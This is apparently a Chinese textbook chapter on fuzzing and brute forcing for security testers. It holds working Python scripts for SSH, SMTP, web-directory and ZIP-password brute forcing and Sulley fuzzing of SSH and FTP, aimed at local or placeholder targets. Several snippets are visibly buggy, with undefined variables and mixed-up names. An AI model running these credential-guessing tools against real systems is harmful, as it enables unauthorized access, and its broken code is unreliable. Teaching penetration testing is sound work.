# 第五章：模糊和暴力破解

安全测试人员最有用的工具之一是模糊测试工具，用于测试应用程序的参数。模糊测试在发现安全漏洞方面非常有效，因为它可以通过扫描应用程序的攻击面来发现弱点。模糊生成器可以测试应用程序的目录遍历、命令执行、SQL 注入和跨站脚本漏洞。

最好的模糊生成器是高度可定制的，因此在本章中，我们将学习如何构建可以用于特定应用程序的自己的模糊生成器。

本章涵盖的主题如下：

+   模糊和暴力破解密码

+   SSH 暴力破解

+   SMTP 暴力破解

+   暴力破解目录和文件位置

+   暴力破解密码保护的 zip 文件

+   Sulley 模糊框架

# 模糊化

一般来说，模糊化过程包括以下阶段：

+   **识别目标**：对于模糊化应用程序，我们必须确定目标应用程序。例如，具有特定 IP 并在端口 21 上运行的 FTP 服务器。

+   **识别输入**：正如我们所知，漏洞存在是因为目标应用程序接受了格式不正确的输入并在未经过消毒的情况下进行处理。因此，我们必须确定应用程序接受的输入。例如，在 FTP 服务器中，用户名和密码是输入。

+   **创建模糊数据**：在获取所有输入参数后，我们必须创建无效的输入数据发送到目标应用程序。模糊数据通常被称为有效载荷。

+   **模糊化**：创建模糊数据后，我们必须将其发送到目标应用程序。

+   **监视异常和日志记录**：现在我们必须观察目标应用程序的有趣响应和崩溃，并保存这些数据以进行手动分析。监视 Web 应用程序的模糊测试有点不同，因为模糊测试可能不会使目标应用程序崩溃。我们必须依赖错误消息和响应；确保记下任何此类意外响应以进行手动分析。有时应用程序可能会在错误消息中透露内部构建块。

+   **确定可利用性**：模糊化后，我们必须检查有趣的响应或导致崩溃的输入。这可能有助于利用目标应用程序。并非所有崩溃都会导致可利用的漏洞。

# 模糊生成器的分类

基于目标、使用的攻击向量和模糊化方法，存在许多模糊化的分类。模糊化目标包括文件格式、网络协议、命令行参数、环境变量、Web 应用程序等。模糊化可以根据生成测试用例的方式进行广泛分类。它们是突变模糊化（转储）和生成模糊化（智能）。

## 突变（转储）模糊生成器

创建完全随机输入的模糊生成器称为突变或转储模糊生成器。这种类型的模糊生成器盲目地突变现有的输入值。但它缺乏可理解的数据格式或结构。例如，它可以替换或附加随机数据片段到所需的输入。

## 智能模糊生成器

生成模糊生成器从头开始创建输入，而不是突变现有输入。因此，它需要一定程度的智能，以生成对目标应用程序至少有些意义的输入。

与突变模糊生成器相比，这种类型将了解文件格式、协议等。此外，这种类型的模糊生成器难以创建，但更有效。

# 模糊和暴力破解密码

密码可以通过猜测或尝试使用每种可能的单词和字母组合来破解。如果密码很复杂，包括数字、字符和特殊字符的组合，可能需要几小时、几周或几个月。

# 字典攻击

从可能被用作密码的单词开始，测试所有可能的密码。这种方法与我们对注入所做的方法相同。

我们可以从字典文件中读取密码并在应用程序中尝试：

```py
with open('password-dictionary.txt') as f: 
    for password in f: 
        try: 
                # Use the password to try login 

                print "[+] Password Found: %s" % password 
                break; 
        except : 
                print "[!] Password Incorrect: %s" % password 

```

在这里，我们读取`字典`文件并在我们的脚本中尝试每个密码。当特定密码有效时，它将在控制台中打印出来。

### 提示

您可以在这里下载整个模糊数据库列表：[`github.com/fuzzdb-project/fuzzdb`](https://github.com/fuzzdb-project/fuzzdb)。

# SSH 暴力破解

我们可以使用 Python 脚本来自动化暴力破解攻击以破解 SSH 登录。在这里，我们尝试多个用户名和密码以绕过 SSH 身份验证，使用自动化的 Python 脚本。对于 SSH 的暴力破解，我们必须使用一个名为**paramiko**的模块，它让我们连接到 SSH。

首先，我们导入所需的模块：

```py
import paramiko, sys, os, socket  
import itertools,string,crypt  

```

然后我们初始化静态变量，如密码大小、目标 IP、目标端口和用户：

```py
PASS_SIZE = 5 
IP = "127.0.0.1" 
USER = "root" 
PORT=22 

var = itertools.combinations(string.digits,PASS_SIZE) 

```

检查每个密码：

```py
try: 
    for i in var: 
        passwd = ''.join(i) 

        ssh_client = paramiko.SSHClient() 
        ssh_client.load_system_host_keys() 
           ssh_clienth.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy()) 
        try: 
            ssh.connect(IP , port=PORT, username=USER, password=passwd) 
            print "Password Found= "+passwd 
            break 
        except paramiko.AuthenticationException, error: 
            print "Faild Attempt: "+passwd 
            continue 
        except socket.error, error: 
            print error 
            continue 
        except paramiko.SSHException, error: 
            print error 
            continue 
        except Exception, error: 
            print "Unknown error: "+error 
            continue     
        ssh.close() 

except Exception,error : 
    print error  

```

我们可以使用线程模块使此脚本多线程化：

```py
import paramiko, sys, os, socket, threading, time  
import itertools,string,crypt 

PASS_SIZE = 5 

def bruteforce_list(charset, maxlength): 
    return (''.join(candidate) 
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i) 
        for i in range(1, maxlength + 1))) 

def attempt(Password): 

    IP = "127.0.0.1" 
    USER = "rejah" 
    PORT=22 

    try: 

        ssh = paramiko.SSHClient() 
        ssh.load_system_host_keys() 
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy()) 

        try: 
            ssh.connect(IP , port=PORT, username=USER, password=Password) 
            print "Connected successfully. Password = "+Password 
        except paramiko.AuthenticationException, error: 
            print "Incorrect password: "+Password 
            pass 
        except socket.error, error: 
            print error 
            pass 
        except paramiko.SSHException, error: 
            print error 
            print "Most probably this is caused by a missing host key" 
            pass 
        except Exception, error: 
            print "Unknown error: "+error 
            pass     
        ssh.close() 

    except Exception,error : 
        print error 

letters_list = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQSTUVWXYZ1234567890!@#$&()'  

```

在这里，我们使用线程来使模糊测试并行运行，以提高速度：

```py
for i in bruteforce_list(letters_list, PASS_SIZE): 
    t = threading.Thread(target=attempt, args=(i)) 
    t.start() 
    time.sleep(0.3) 

sys.exit(0) 

```

# SMTP 暴力破解

**简单邮件传输协议**（**SMTP**）是网络上的电子邮件传输标准。电子邮件服务器和其他邮件传输代理使用 SMTP 来发送和接收电子邮件。电子邮件客户端应用程序通常仅使用 SMTP 发送电子邮件。要对 SMTP 进行暴力破解密码审计，我们可以使用`smptlib`模块，它可以帮助我们连接到 SMTP。

像往常一样，导入所需的模块：

```py
import sys, smtplib, socket 
from smtplib import SMTP 

```

设置`IP`和`USER`。您也可以将这些值作为输入参数获取：

```py
IP = "127.0.0.1" 
USER = "admin"  

```

检查 SMTP 中的每个密码列表中的密码：

```py
attackNumber = 1 
with open('passwordlist.txt') as f: 
    for PASSWORD in f: 
         try: 
               print "-"*12 
               print "User:",USER,"Password:",PASSWORD 
               smtp = smtplib.SMTP(IP) 
               smtp.login(user, value) 
               print "\t\nLogin successful:",user, value 
               smtp.quit() 
               work.join() 
               sys.exit(2) 
         except(socket.gaierror, socket.error, socket.herror,
         smtplib.SMTPException), msg:  
               print "An error occurred:", msg 

```

# 暴力破解目录和文件位置

我们可以编写一个自定义的蜘蛛脚本来爬取目标网站，以发现有关 Web 应用程序的足够信息。然而，通常会有很多配置文件、剩余的开发文件、备份文件、调试脚本和许多其他文件，这些文件可以提供有关 Web 应用程序的敏感信息，或者公开一些开发人员没有打算公开的功能。

发现这种类型的内容的方法是使用暴力破解来追踪常见的文件名和目录。拥有我们自己的自定义脚本总是更好的，这将帮助我们自定义目标文件并根据我们的要求过滤结果。

首先，像往常一样，我们导入所需的模块。这里我们使用线程来并行运行多个请求。但是请确保保持线程数量较低；大量的线程可能会导致拒绝服务：

```py
import urllib 
import urllib2 
import threading 
import Queue 

threads           = 50     # Be aware that a large number of threads can cause a denial of service!!! 
target_url        = "http://www.example.com" 
wordlist_file     = "directory-list.txt"  
user_agent        = "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0" 

```

现在我们定义一个函数来读取单词列表文件并形成一个用于暴力破解的单词数组：

```py
def wordlist(wordlist_file): 

    wordlist_file = open(wordlist_file,"rb") 
    raw_words = wordlist_file.readlines() 
    wordlist_file.close() 

    words        = Queue.Queue() 

    # iterating each word in the word file 
    for word in raw_words:       

        word = word.rstrip() 
        words.put(word) 

    return words  

```

接下来，我们将定义一个函数，用于使用单词列表中单词的可能扩展名来暴力破解 URL，检查文件扩展名的单词，如果不是文件，则添加额外的斜杠（`/`），并为每个单词创建一个可能扩展名和目录斜杠的尝试列表。创建尝试列表后，检查附加到提供的 URL 的尝试列表中的每个条目：

```py
def dir_bruteforce(extensions=None): 

    while not word_queue.empty(): 
        attempt = word_queue.get() 

        attempt_list = [] 

        # check for a file extension, if not it's a directory 
        if "." not in attempt: 
            attempt_list.append("/%s/" % attempt) 
        else: 
            attempt_list.append("/%s" % attempt) 

        # if we want to bruteforce extensions 
        if extensions: 
            for extension in extensions: 
                attempt_list.append("/%s%s" % (attempt,extension)) 

        # iterate with list of attempts         
        for brute in attempt_list: 

            url = "%s%s" % (target_url,urllib.quote(brute)) 

            try: 
                headers = {} 
                headers["User-Agent"] = user_agent 
                r = urllib2.Request(url,headers=headers) 

                response = urllib2.urlopen(r) 

                if len(response.read()): 
                    print "[%d] => %s" % (response.code,url) 

            except urllib2.HTTPError,e: 
               # print output If error code is not 404 
                if e.code != 404: 
                    print "!!! %d => %s" % (e.code,url) 

                pass 

word_queue = wordlist(wordlist_file) 
extensions = [".php",".bak",".orig",".inc"]  

```

然后我们以线程模式启动暴力破解：

```py
for i in range(threads): 
            t = threading.Thread(target=dir_bruteforce,args=(extensions,)) 
            t.start() 

```

# 暴力破解密码保护的 ZIP 文件

正如我们讨论的，可以使用相同的方法来破解受保护的 ZIP 文件中的密码。为此，我们使用`zipfile`模块：

```py
import zipfile 

filename = 'test.zip' 
dictionary = 'passwordlist.txt' 

password = None 
file_to_open = zipfile.ZipFile(filename) 
with open(dictionary, 'r') as f: 
   for line in f.readlines(): 
         password = line.strip('\n') 
         try: 
               file_to_open.extractall(pwd=password) 
               password = 'Password found: %s' % password 
               print password 
         except: 
               pass 

```

## Sulley 模糊测试框架

通过使用模糊测试框架，我们可以更快地创建模糊器。模糊测试框架提供了一个灵活和可重用的开发环境，有助于快速构建模糊器。

Sulley 是一个 Python 模糊测试框架，由多个可扩展组件组成，可用于模糊文件格式、网络协议、命令行参数等。Sulley 可以监视网络并系统地记录。它还可以监视目标的健康状况。

### 安装

Sulley 依赖于 PaiMei 和 pcapy。PaiMei 是一个逆向工程框架，用于调试模糊应用程序和`pcap`捕获数据包。

PaiMei 有很多依赖项，如提供 Python 数据库 API 的 MySQL 数据库服务器，wxPython，GraphViz，Oreas GDE，uDraw，pydot 和 ctypes。因此，我们必须首先安装这些依赖项。

在 Debian Linux 中，我们可以从`apt-get`存储库安装 pydot，ctypes，wxPython 和 GraphViz：

```py
$ apt-get instal
l python-ctypeslib python-pydot python-wxgtk2.8 python-mysqldb python-pygraphviz

```

然后我们可以从[`www.openrce.org/downloads/details/208`](http://www.openrce.org/downloads/details/208)下载 PaiMei。

解压缩 zip 文件后，运行`_install_requirements.py`文件以安装其要求。之后，如果主机机器上没有安装 MySql 服务器，则安装 MySql 服务器：

```py
 $ apt-get install mysql-server

```

然后，使用`__setup_mysql.py`文件配置 MySQL 服务器。为此，请使用以下 Python 脚本运行您的 MySQL 服务器凭据作为参数：

```py
 $ python __setup_mysql.py hostname username password

```

然后通过运行设置脚本来安装 PaiMei，就像我们为其他 Python 模块所做的那样：

```py
$ python setup.py build
$ python setup.py install

```

我们还需要安装`pcapy`库。要安装`pcapy`库，我们可以依赖于`apt-get`存储库：

```py
 $ apt-get install python-pcapy python-impacket

```

现在我们已经安装了所有的先决条件。因此，我们可以克隆`sulley`库并使用它：

```py
 $ git clone https://github.com/OpenRCE/sulley.git

```

然后进入`sulley`文件夹：

```py
 $ cd sulley

```

要验证安装，请使用 Python 运行`process_monitor.py`脚本和`network_monitor.py`：

```py
$ sudo python process_monitor.py

```

输出如下：

![安装](img/image_05_001.jpg)

```py
$ python network_monitor.py

```

输出如下：

![安装](img/image_05_002.jpg)

要在 Windows 上安装，就像在 Linux 上一样，首先安装先决条件。

要安装 PaiMei，请像在 Linux 上那样从链接下载并运行`__install_requirements.py`：

```py
 $ python __install_requirements.py

```

这将安装 PaiMei 的依赖项（ctypes，pydot，wxPython，MySQLdb，Graphviz，Oreas GDE 和 uDraw）。

然后，运行 MySQL 设置`script.python __setup_mysql.py`主机名用户名密码。

之后，通过运行构建和安装命令来安装 PaiMei 库：

```py
$ python setup.py build
$ python setup.py install

```

然后我们需要下载并安装`libdasm`。从[`libdasm.googlecode.com/files/libdasm-beta.zip`](http://libdasm.googlecode.com/files/libdasm-beta.zip)下载并运行设置。

然后，从`pip`安装`pcapy`：

```py
 $ pip install pcapy

```

现在，克隆`sulley`库：

```py
 $ git clone https://github.com/OpenRCE/sulley.git

```

我们可以通过运行`process_monitor_unix.py`和`network_monitor.py`来检查安装。

### 提示

安装有任何问题吗？这是 Windows 的详细安装说明：[`github.com/OpenRCE/sulley/wiki/Windows-Installation`](https://github.com/OpenRCE/sulley/wiki/Windows-Installation)。

### 使用 sulley 进行脚本编写

在我们开始使用 sulley 编写模糊脚本之前，我们需要对将在 sulley 中使用的语法有基本的了解。当我们编写一个使用 sulley 模糊特定目标的 Python 脚本时，我们需要定义所有必需的对象。所有 sulley 命令都以`s_`前缀开头。以下是将用于构建脚本的几个部分：

+   **数据模型**：定义我们将要模糊的协议的属性。

+   **状态模型**：定义模糊网络协议不同状态之间的可能交互。例如，经过身份验证和未经身份验证的状态。

+   **目标**：定义要模糊的目标。例如，服务器的 IP 和端口。

+   **代理**：监视模糊进程崩溃，拦截相关网络数据包，重新启动崩溃的进程等的程序。这在目标计算机上运行。

+   **监视界面**：帮助查看模糊处理的结果。

### 基元

要创建一个静态的不可变值，我们可以使用`s_static()`。

要创建一个四字节的单词，我们可以使用`s_int()`。例如，创建以`555`开头并以 ASCII 格式化的变异整数：

```py
s_int("555", format="ascii", fuzzable=True) 

```

### 块和组

原语可以嵌套在块内。这样的块可以以`s_block_start()`开始，并以`s_block_end()`结束。一个组是原语的集合；我们可以用`s_group()`开始一个组。一个静态组原语的示例列出了各种 HTTP 方法如下：

```py
s_group("methods", values=["GET", "HEAD", "POST", "TRACE"])   

```

分组允许我们将块附加到组原语上，以指定该块应循环遍历所有可能的方式。我们可以通过块迭代这些静态 HTTP 方法如下。这定义了一个名为`"body"`的新块，并将其与前面的组关联起来：

```py
if s_block_start(“body”, group=”method”)
 s_delim("/")
 s_string("index.html")
 s_delim(" ")
s_block_end()

```

### 会话

我们可以将多个请求绑定在一起形成一个会话。Sulley 能够通过在图中将请求链接在一起来模糊*深入*协议。Sulley 通过图结构，从根节点开始，沿途模糊每个组件。

现在我们可以编写一个脚本来模糊测试 SSH 连接。

首先，导入模块`sulley`和`paramiko`。确保脚本位于我们从 GitHub 下载的 sulley 程序的根目录中：

```py
from sulley import * 
import sulley.primitives 
import paramiko 

```

然后，将用户名和密码设置为字符串原语。Sulley 提供`s_string()`原语来表示这些字段，以表示其中包含的数据是可模糊的字符串。字符串可以是任何东西，如电子邮件地址、主机名、用户名、密码等等。

```py
user = primitives.string("user") 
pwd = primitives.string("password") 

```

然后，初始化 paramiko SSH 客户端以尝试连接到 SSH：

```py
client = paramiko.SSHClient() 
client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 

```

接下来我们可以开始模糊测试：

```py
while(user.mutate() and pwd.mutate()): 
   username = user.value 
   password = pwd.value 
   try: 
         # Try to connect to the server with the mutated credentials 
         client.connect("192.168.1.107", 22, username, password, timeout=5) 
         client.close() 
   except Exception,e: 
         print "error! %s" % e 

```

这将尝试变异用户名和密码，并尝试使用 paramiko 连接到服务器。

同样，我们可以对 FTP 协议进行模糊测试。在这里，我们从 requests 和 sulley 导入 FTP：

```py
from sulley import * 
from requests import ftp 

```

现在，我们指示 sulley 在开始模糊测试之前等待横幅：

```py
def recv_banner(sock): 
   sock.recv(1024) 

```

然后，我们初始化会话，这样可以跟踪我们的模糊测试。这使我们能够在先前离开的地方停止和重新开始模糊测试：

```py
sess = sessions.session("ftp_test.session") 

```

现在我们可以使用目标 FTP 服务器的 IP 和端口号来定义我们的目标：

```py
target = sessions.target("192.168.1.107",21) 

```

然后，我们可以指示网络嗅探器在同一主机上设置自己，并监听`26300`：

```py
target.netmon = pedrpc.client("192.168.1.107",26300)  

```

现在，设置目标并获取 FTP 横幅：

```py
sess.add_target(target) 
sess.pre_send(recv_banner) 

```

尝试认证 FTP 连接：

```py
sess.connect(s_get("user")) 
sess.connect(s_get("user"),s_get("pass")) 

```

认证后，我们可以使用需要认证的命令，如下所示：

```py
sess.connect(s_get("pass"),s_get("cwd")) 
sess.connect(s_get("pass"),s_get("mkd")) 
sess.connect(s_get("pass"),s_get("rmd")) 
sess.connect(s_get("pass"),s_get("list")) 
sess.connect(s_get("pass"),s_get("delete")) 
sess.connect(s_get("pass"),s_get("port"))  

```

最后，指示 sulley 开始`fuzz`：

```py
sess.fuzz()  

```

### 提示

您可以在这里了解更多关于 sulley 及其用法：[`www.fuzzing.org/wp-content/SulleyManual.pdf`](http://www.fuzzing.org/wp-content/SulleyManual.pdf)。

# 总结

我们已经了解了模糊测试和密码暴力破解的基本方法。现在我们可以扩展脚本以满足我们自己的需求。有许多模糊测试和暴力破解工具可用，但自定义脚本总是更好以获得我们特定的结果。我们将在下一章中更多地讨论使用 Python 库进行调试和逆向工程。
